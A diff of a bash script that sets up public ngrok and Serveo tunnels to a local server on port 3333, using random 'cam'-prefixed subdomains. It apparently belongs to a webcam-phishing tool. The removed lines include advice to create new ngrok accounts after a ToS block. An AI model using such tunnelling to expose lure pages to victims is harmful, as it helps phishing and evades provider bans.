@@ -274,89 +274,51 @@ setup_ngrok_auth() {
 # Start ngrok tunnel
 # ============================================================================
 try_ngrok() {
-	# All debug output goes to stderr so it doesn't get captured
 	local NGROK_CMD=""
 	
 	# Find ngrok
-	if $IS_WINDOWS && [[ -x ./ngrok.exe ]]; then
+	if $IS_WINDOWS && [[ -f ./ngrok.exe ]]; then
 		NGROK_CMD="./ngrok.exe"
-	elif [[ -x ./ngrok ]]; then
+	elif [[ -f ./ngrok ]]; then
 		NGROK_CMD="./ngrok"
 	elif has_cmd ngrok; then
 		NGROK_CMD="ngrok"
 	else
-		echo "[!] ngrok not found" >&2
 		return 1
 	fi
 
-	printf "\e[1;92m[+] Starting ngrok http 3333...\e[0m\n"
+	printf "\e[1;92m[+] ngrok: starting...\e[0m\n"
 	
-	# Start ngrok - output everything to ngrok.log
+	# Start ngrok
 	$NGROK_CMD http 3333 > ngrok.log 2>&1 &
 	local ngrok_pid=$!
-	printf "\e[1;92m[+] ngrok PID: $ngrok_pid\e[0m\n"
 	
-	# Wait for startup
-	sleep 2
-	
-	# Check process still alive
-	if ! kill -0 $ngrok_pid 2>/dev/null; then
-		printf "\e[1;31m[!] ngrok failed to start\e[0m\n"
-		printf "\e[1;93m[DEBUG] Full ngrok.log:\e[0m\n"
-		cat ngrok.log
-		return 1
-	fi
-	
-	printf "\e[1;92m[+] Polling for tunnel URL (20 sec timeout)...\e[0m\n"
-	
-	# Poll for link
-	local attempts=0
-	while [[ $attempts -lt 20 ]]; do
-		attempts=$((attempts+1))
+	# Quick 5-second timeout
+	local elapsed=0
+	while [[ $elapsed -lt 5 ]]; do
+		sleep 1
+		elapsed=$((elapsed+1))
 		
-		# Check if link is in the log
+		# Check if process alive
+		if ! kill -0 $ngrok_pid 2>/dev/null; then
+			printf "\e[1;31m[!] ngrok failed\e[0m\n"
+			kill $ngrok_pid 2>/dev/null || true
+			return 1
+		fi
+		
+		# Check for link
 		local link=$(grep -o 'https://[A-Za-z0-9.-]*\.ngrok\.io' ngrok.log 2>/dev/null | head -1)
 		if [[ -n "$link" ]]; then
-			printf "\e[1;92m[✓] Got ngrok URL after $attempts sec: $link\e[0m\n"
+			printf "\e[1;92m[✓] ngrok ready: $link\e[0m\n"
 			echo "$link"
 			return 0
 		fi
 		
-		# Show progress every 5 sec
-		if (( attempts % 5 == 0 )); then
-			printf "\e[1;92m[+] Still waiting... ($attempts/20 sec)\e[0m\n"
-		fi
-		
-		# Check if ngrok is still alive
-		if ! kill -0 $ngrok_pid 2>/dev/null; then
-			printf "\e[1;31m[!] ngrok process died at attempt $attempts\e[0m\n"
-			printf "\e[1;93m[DEBUG] Full ngrok.log:\e[0m\n"
-			cat ngrok.log
-			return 1
-		fi
-		
-		sleep 1
+		printf "."
 	done
 	
-	# Timeout - show full log for debugging
-	printf "\e[1;31m[!] TIMEOUT: ngrok did not produce tunnel URL in 20 seconds\e[0m\n"
-	printf "\e[1;93m[DEBUG] Full ngrok.log for debugging:\e[0m\n"
-	cat ngrok.log
-	
-	# Check if it's a blocked account error
-	if grep -q "blocked" ngrok.log || grep -q "ERR_NGROK" ngrok.log; then
-		printf "\n\e[1;31m[!] NGROK ACCOUNT ISSUE DETECTED!\e[0m\n"
-		printf "\e[1;31m[!] Your ngrok account may be:\e[0m\n"
-		printf "    - Blocked for violating ToS\n"
-		printf "    - Rate limited\n"
-		printf "    - Suspended\n"
-		printf "\e[1;93m[*] Solutions:\e[0m\n"
-		printf "    1. Go to https://dashboard.ngrok.com\n"
-		printf "    2. Check your account status\n"
-		printf "    3. Create a NEW account if needed\n"
-		printf "    4. Get a NEW authtoken\n"
-	fi
-	
+	# Timeout
+	printf "\n\e[1;93m[!] ngrok timeout (5sec)\e[0m\n"
 	kill $ngrok_pid 2>/dev/null || true
 	return 1
 }
@@ -365,35 +327,56 @@ try_ngrok() {
 # Start Serveo tunnel (fallback)
 # ============================================================================
 try_serveo() {
-	printf "\e[1;92m[*] Attempting Serveo fallback...\e[0m\n"
+	printf "\e[1;92m[+] serveo: starting SSH tunnel...\e[0m\n"
 	
 	if ! has_cmd ssh; then
-		printf "\e[1;93m[!] ssh not available (Serveo requires it)\e[0m\n"
+		printf "\e[1;31m[!] ssh not available\e[0m\n"
 		return 1
 	fi
 
 	# Generate random subdomain
 	local subdomain="cam$RANDOM"
 	
-	printf "\e[1;92m[+] Starting SSH tunnel to serveo.net...\e[0m\n"
+	# Start SSH tunnel
 	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1 &
+	local ssh_pid=$!
 	
-	sleep 10
+	# Quick polling (3 seconds)
+	local elapsed=0
+	while [[ $elapsed -lt 3 ]]; do
+		sleep 1
+		elapsed=$((elapsed+1))
+		
+		# Check for link
+		if [[ -f sendlink ]]; then
+			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+			if [[ -n "$link" ]]; then
+				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
+				echo "$link"
+				return 0
+			fi
+		fi
+		
+		printf "."
+	done
 	
-	# Extract URL from sendlink
-	local link=""
+	# Still waiting - give it more time but show progress
+	printf "\n\e[1;92m[+] serveo: waiting for link...\e[0m\n"
+	sleep 7
+	
+	# Final check
 	if [[ -f sendlink ]]; then
-		link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+		local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+		if [[ -n "$link" ]]; then
+			printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
+			echo "$link"
+			return 0
+		fi
 	fi
-
-	if [[ -n "$link" ]]; then
-		printf "\e[1;92m[✓] Serveo tunnel ready\e[0m\n"
-		echo "$link"
-		return 0
-	else
-		printf "\e[1;93m[!] Serveo failed\e[0m\n"
-		return 1
-	fi
+	
+	printf "\e[1;93m[!] serveo timeout\e[0m\n"
+	kill $ssh_pid 2>/dev/null || true
+	return 1
 }
 
 # ============================================================================
